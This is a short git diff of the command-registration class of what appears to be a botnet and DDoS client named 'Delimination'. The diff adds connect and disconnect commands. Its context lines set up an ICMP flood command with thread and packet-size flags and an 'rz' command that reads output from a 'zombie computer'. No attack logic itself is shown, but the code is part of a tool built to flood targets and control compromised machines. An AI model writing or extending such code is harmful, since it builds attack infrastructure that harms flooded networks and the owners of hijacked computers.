@@ -17,9 +17,6 @@ import org.jnetwork.DataPackage;
 public class ClientCommands {
 	private CommandInterface commands = new CommandInterface();
 
-	/**
-	 * 
-	 */
 	public ClientCommands() {
 		commands.addCommandExecutionListener(new CommandExecutionListener() {
 			@Override
@@ -56,6 +53,12 @@ public class ClientCommands {
 						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
 						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
 						new FlagData("-v", "Checks if the address is valid before the DDoS starts.")));
+		commands.putCommand("disconnect",
+				new CommandData("disconnect", "Disconnects from the server.", 0, CommandActions.getDisconnectAction()));
+		commands.putCommand("connect",
+				new CommandData("connect <server>", "Sets the server of the Delimination client to the given address.",
+						1, CommandActions.getConnectAction(),
+						new FlagData("-v", "Checks to see if the address is valid before connecting.")));
 		commands.putCommand("rz",
 				new CommandData("rz <address>",
 						"Continuously reads the output from a zombie computer until the command is exited.", 1,
